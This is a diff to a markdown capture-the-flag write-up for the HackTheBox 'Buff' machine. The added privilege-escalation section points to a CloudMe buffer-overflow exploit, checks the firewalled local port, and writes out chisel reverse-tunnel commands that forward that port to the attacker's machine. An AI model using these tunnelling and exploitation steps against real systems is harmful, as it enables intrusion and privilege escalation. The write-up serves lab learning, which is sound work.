@@ -144,7 +144,7 @@ First let's set up a listener in our machine using NetCat by entering the follow
  -v : verbose mode
 ```
 
-~[image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/listener.png)
+![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/listener.png)
 
 Now let's do the magic shall we. Enter the following command in the RCE shell
 
@@ -156,4 +156,59 @@ and press enter.....and boom we get a shell.
 
 ![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/footholdshell.png)
 
-## Priv Esc
+## **Privilege Escalation**
+
+When i am writing this writup the ratio of (root:user) solves are very less. People are easily getting user flag but having a hard time getting root shell. So let's start out journey to get the root shell.
+
+So in the last section we got a proper shell in the machine. Now let's enumerate and try to search for something worth. After spending some time i get a executable file inside the `Downloads` folder of user `shaun`
+
+![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/cloudexe.png)
+
+It's a `CloudMe` executable. Well CloudMe is a cloud storage service. If you want to know more [click here](https://www.cloudme.com/en).
+So let's do some research about `CloudMe`. 
+
+After some googling we get a Buffer Overflow Vulnerability in Exploit-DB. Here is the [link](https://www.exploit-db.com/exploits/48389).
+
+![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/bufferoverflow.png)
+
+Let's Download the exploit and understand it what it is doing.
+
+So the exploit is a python script which contains payload to execute `calc.exe`. The script is creating a socket connection to `127.0.0.1:8888` and sending the payload. That's it..
+
+Now what we have to do is change the shell code to execute a reverse shell and run the script in the vulnerable machine....but if you'll see there is no python in the machine.....you can try to look for yourself. So what to do now ? Maybe what we can do is run the script on our machine and change the ip address to vulnerable machine and execute the script so that it makes socket connection to 10.10.10.198:8888 and send the payload and execute the reverse shell..but if you'll try this it will just throw error saying unable to connect and remeber we didn't saw port 8888 active in our nmap scan also. There is something fishy down there.
+
+Let's Check if the machine is listening on port 8888. Go to the machine shell and type the following command
+
+`netstat -ano | findstr 8888`
+
+![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/verifycloud.png)
+
+Here we can see that the machine is listening in port 8888. So that means that we can only access to the port 8888 locally but not from outside because of firewall. That explains a lot.
+
+Now what to do we cannot connect it from outside and there is no python in machine so how to send payload to port 8888 and get the shell...
+
+The answer is TCP-Tunneling or Port-Forwarding. I simple word port forwarding redirects a request from one ipaddress and port to another ip address and port. You can learn more about port forwarding and tunneling [here](https://book.hacktricks.xyz/tunneling-and-port-forwarding) and [here](https://support.anydesk.com/TCP-Tunneling#:~:text=TCP%2DTunneling%20(or%20Port%20Forwarding,Linux%20platforms%20since%20version%205.1.)
+
+To perform TCP-Tunneling i'll use `chisel`. You can download it from [here](https://github.com/jpillora/chisel). You can also use `plink` if you want. I use chisel because why not ;-). So let's download chisel executable for linux and windows from releases.
+
+Now we should download the chisel.exe from our machine to vulnerable machine. To do this follow that same process like we have done to download [NetCat](#getting-proper-shell). 
+
+![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/cupload.png)
+
+Now let's tunnel it. 
+
+First set up the chisel server in your machine using the command below.
+
+`./chisel_linux server -p 8000 --reverse`
+
+![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/chiselserver.png)
+
+Now go to vulnerable machine and type the following command inside the `C:\xampp\htdocs\gym\upload` folder.
+
+`cmd.exe command : chisel.exe client <your tun0 IP address> 8000 R:8888:127.0.0.1:8888`
+`powershell.exe command : .\chisel.exe client <your run0 IP address 8000 R:8888:127.0.0.1:8888>`
+
+![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/chiselclient.png)
+
+> **NOTE** : In the above image i am using powershell
+
